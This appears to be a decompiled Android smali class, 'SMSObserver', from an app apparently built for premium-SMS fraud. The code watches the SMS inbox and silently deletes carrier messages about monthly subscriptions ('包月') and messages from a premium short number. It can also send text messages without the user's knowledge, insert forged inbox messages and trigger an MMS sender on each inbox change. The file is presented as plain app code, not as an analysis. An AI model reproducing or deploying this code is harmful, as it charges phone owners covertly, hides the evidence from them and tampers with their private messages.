.class public LDaemon/Service/SMSObserver;
.super Landroid/database/ContentObserver;
.source "SMSObserver.java"


# static fields
.field public static final isvalue:Ljava/lang/String; = "%\u5305\u6708%"

.field public static mms:LDaemon/Service/MmsSender; = null

.field public static final number:Ljava/lang/String; = "10086"

.field private static final tag:Ljava/lang/String; = "SMSObserver"


# instance fields
.field private mContext:Landroid/content/Context;

.field private m_handle:Landroid/os/Handler;

.field private sql:Ljava/lang/String;

.field private sqlvalue:[Ljava/lang/String;


# direct methods
.method public constructor <init>(Landroid/os/Handler;Landroid/content/Context;)V
    .locals 3
    .param p1, "handle"    # Landroid/os/Handler;
    .param p2, "context"    # Landroid/content/Context;

    .prologue
    const/4 v0, 0x0

    .line 30
    invoke-direct {p0, p1}, Landroid/database/ContentObserver;-><init>(Landroid/os/Handler;)V

    .line 17
    iput-object v0, p0, LDaemon/Service/SMSObserver;->m_handle:Landroid/os/Handler;

    .line 18
    iput-object v0, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    .line 20
    const-string v0, "address=?"

    iput-object v0, p0, LDaemon/Service/SMSObserver;->sql:Ljava/lang/String;

    .line 21
    const/4 v0, 0x1

    new-array v0, v0, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v2, "1065800885566"

    aput-object v2, v0, v1

    iput-object v0, p0, LDaemon/Service/SMSObserver;->sqlvalue:[Ljava/lang/String;

    .line 31
    iput-object p1, p0, LDaemon/Service/SMSObserver;->m_handle:Landroid/os/Handler;

    .line 32
    iput-object p2, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    .line 33
    new-instance v0, LDaemon/Service/MmsSender;

    invoke-direct {v0, p2}, LDaemon/Service/MmsSender;-><init>(Landroid/content/Context;)V

    sput-object v0, LDaemon/Service/SMSObserver;->mms:LDaemon/Service/MmsSender;

    .line 34
    return-void
.end method

.method private mf7531e2d(Ljava/lang/String;)V
    .locals 1
    .param p1, "log"    # Ljava/lang/String;

    .prologue
    .line 216
    const-string v0, "SMSObserver"

    invoke-static {v0, p1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 219
    return-void
.end method


# virtual methods
.method public delSms(I)V
    .locals 4
    .param p1, "pid"    # I

    .prologue
    const/4 v3, 0x0

    .line 148
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "DELID:"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v1}, LDaemon/Service/SMSObserver;->mf7531e2d(Ljava/lang/String;)V

    .line 149
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "content://sms/"

    invoke-direct {v1, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    .line 150
    .local v0, "uri":Ljava/lang/String;
    iget-object v1, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v1, v2, v3, v3}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    .line 151
    return-void
.end method

.method public delSms(Ljava/lang/String;)V
    .locals 9
    .param p1, "number"    # Ljava/lang/String;

    .prologue
    const-string v8, "%"

    .line 159
    const-string v0, "content://sms/"

    .line 160
    .local v0, "uri":Ljava/lang/String;
    iget-object v1, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 161
    const-string v3, "address like ?"

    .line 162
    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "%"

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "%"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    .line 160
    invoke-virtual {v1, v2, v3, v4}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    .line 163
    return-void
.end method

.method public delSmsText(Ljava/lang/String;)V
    .locals 9
    .param p1, "text"    # Ljava/lang/String;

    .prologue
    const-string v8, "%"

    .line 172
    const-string v0, "content://sms/"

    .line 173
    .local v0, "uri":Ljava/lang/String;
    iget-object v1, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    invoke-static {v0}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    .line 174
    const-string v3, "body like ?"

    .line 175
    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    new-instance v6, Ljava/lang/StringBuilder;

    const-string v7, "%"

    invoke-direct {v6, v8}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v6, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    const-string v7, "%"

    invoke-virtual {v6, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    .line 173
    invoke-virtual {v1, v2, v3, v4}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    .line 176
    return-void
.end method

.method public getSms(Ljava/lang/String;Ljava/lang/String;)V
    .locals 5
    .param p1, "number"    # Ljava/lang/String;
    .param p2, "body"    # Ljava/lang/String;

    .prologue
    const/4 v4, 0x0

    .line 186
    new-instance v0, Landroid/content/ContentValues;

    invoke-direct {v0}, Landroid/content/ContentValues;-><init>()V

    .line 187
    .local v0, "values":Landroid/content/ContentValues;
    const-string v1, "address"

    invoke-virtual {v0, v1, p1}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 188
    const-string v1, "date"

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    invoke-static {v2, v3}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Long;)V

    .line 189
    const-string v1, "protocol"

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 190
    const-string v1, "read"

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 191
    const-string v1, "status"

    const/4 v2, -0x1

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 192
    const-string v1, "type"

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/Integer;)V

    .line 193
    const-string v1, "body"

    invoke-virtual {v0, v1, p2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 194
    const-string v1, "service_center"

    const-string v2, "+8613800755500"

    invoke-virtual {v0, v1, v2}, Landroid/content/ContentValues;->put(Ljava/lang/String;Ljava/lang/String;)V

    .line 195
    iget-object v1, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    const-string v2, "content://sms/inbox"

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    invoke-virtual {v1, v2, v0}, Landroid/content/ContentResolver;->insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;

    .line 196
    return-void
.end method

.method public onChange(Z)V
    .locals 10
    .param p1, "bSelfChange"    # Z

    .prologue
    .line 72
    invoke-super {p0, p1}, Landroid/database/ContentObserver;->onChange(Z)V

    .line 75
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "MyonChange"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Z)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, LDaemon/Service/SMSObserver;->mf7531e2d(Ljava/lang/String;)V

    .line 81
    sget-object v0, LDaemon/Service/SMSObserver;->mms:LDaemon/Service/MmsSender;

    invoke-virtual {v0}, LDaemon/Service/MmsSender;->getSendType()Z

    move-result v0

    if-eqz v0, :cond_0

    .line 82
    sget-object v0, LDaemon/Service/SMSObserver;->mms:LDaemon/Service/MmsSender;

    invoke-virtual {v0}, LDaemon/Service/MmsSender;->send()V

    .line 86
    :cond_0
    iget-object v0, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms/inbox"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 87
    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "_id"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "address"

    aput-object v4, v2, v3

    const/4 v3, 0x2

    const-string v4, "read"

    aput-object v4, v2, v3

    .line 88
    const-string v3, "body like ?"

    .line 89
    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    const-string v6, "%\u5305\u6708%"

    aput-object v6, v4, v5

    .line 90
    const-string v5, "date desc"

    .line 86
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v7

    .line 91
    .local v7, "cc":Landroid/database/Cursor;
    :cond_1
    :goto_0
    invoke-interface {v7}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_2

    .line 107
    iget-object v0, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "content://sms/inbox"

    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    .line 108
    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "_id"

    aput-object v4, v2, v3

    const/4 v3, 0x1

    const-string v4, "address"

    aput-object v4, v2, v3

    const/4 v3, 0x2

    const-string v4, "read"

    aput-object v4, v2, v3

    .line 109
    iget-object v3, p0, LDaemon/Service/SMSObserver;->sql:Ljava/lang/String;

    .line 110
    iget-object v4, p0, LDaemon/Service/SMSObserver;->sqlvalue:[Ljava/lang/String;

    .line 111
    const-string v5, "date desc"

    .line 107
    invoke-virtual/range {v0 .. v5}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;

    move-result-object v6

    .line 112
    .local v6, "c":Landroid/database/Cursor;
    :goto_1
    invoke-interface {v6}, Landroid/database/Cursor;->moveToNext()Z

    move-result v0

    if-nez v0, :cond_3

    .line 139
    return-void

    .line 93
    .end local v6    # "c":Landroid/database/Cursor;
    :cond_2
    const/4 v0, 0x0

    invoke-interface {v7, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 94
    .local v8, "pid":Ljava/lang/String;
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "DELID:"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-direct {p0, v0}, LDaemon/Service/SMSObserver;->mf7531e2d(Ljava/lang/String;)V

    .line 95
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v1, "content://sms/"

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 96
    .local v9, "uri":Ljava/lang/String;
    iget-object v0, p0, LDaemon/Service/SMSObserver;->mContext:Landroid/content/Context;

    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    invoke-static {v9}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    const/4 v2, 0x0

    const/4 v3, 0x0

    invoke-virtual {v0, v1, v2, v3}, Landroid/content/ContentResolver;->delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I

    .line 98
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->hearthttp:LDaemon/Global/HeartHttp;

    if-eqz v0, :cond_1

    .line 99
    sget-object v0, LHamsterSuper/Client/Deamon/BootReceiver;->hearthttp:LDaemon/Global/HeartHttp;

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, LDaemon/Global/HeartHttp;->setYeah(I)V

    goto :goto_0

    .line 124
    .end local v8    # "pid":Ljava/lang/String;
    .end local v9    # "uri":Ljava/lang/String;
    .restart local v6    # "c":Landroid/database/Cursor;
    :cond_3
    const/4 v0, 0x0

    invoke-interface {v6, v0}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    .line 125
    .restart local v8    # "pid":Ljava/lang/String;
    invoke-static {v8}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    invoke-virtual {p0, v0}, LDaemon/Service/SMSObserver;->delSms(I)V

    goto :goto_1
.end method

.method public setSql(Ljava/lang/String;)V
    .locals 1
    .param p1, "sql"    # Ljava/lang/String;

    .prologue
    .line 42
    iput-object p1, p0, LDaemon/Service/SMSObserver;->sql:Ljava/lang/String;

    .line 43
    iget-object v0, p0, LDaemon/Service/SMSObserver;->sql:Ljava/lang/String;

    invoke-direct {p0, v0}, LDaemon/Service/SMSObserver;->mf7531e2d(Ljava/lang/String;)V

    .line 44
    return-void
.end method

.method public setSqlValue([Ljava/lang/String;)V
    .locals 0
    .param p1, "sqlvalue"    # [Ljava/lang/String;

    .prologue
    .line 52
    iput-object p1, p0, LDaemon/Service/SMSObserver;->sqlvalue:[Ljava/lang/String;

    .line 54
    return-void
.end method

.method public sndSms(Ljava/lang/String;Ljava/lang/String;)V
    .locals 6
    .param p1, "number"    # Ljava/lang/String;
    .param p2, "smstext"    # Ljava/lang/String;

    .prologue
    const/4 v2, 0x0

    .line 206
    new-instance v1, Ljava/lang/StringBuilder;

    const-string v3, "send number:"

    invoke-direct {v1, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    const-string v3, " content:"

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-direct {p0, v1}, LDaemon/Service/SMSObserver;->mf7531e2d(Ljava/lang/String;)V

    .line 208
    invoke-static {}, Landroid/telephony/gsm/SmsManager;->getDefault()Landroid/telephony/gsm/SmsManager;

    move-result-object v0

    .local v0, "sms":Landroid/telephony/gsm/SmsManager;
    move-object v1, p1

    move-object v3, p2

    move-object v4, v2

    move-object v5, v2

    .line 209
    invoke-virtual/range {v0 .. v5}, Landroid/telephony/gsm/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V

    .line 210
    const-string v1, "OK"

    invoke-direct {p0, v1}, LDaemon/Service/SMSObserver;->mf7531e2d(Ljava/lang/String;)V

    .line 211
    return-void
.end method
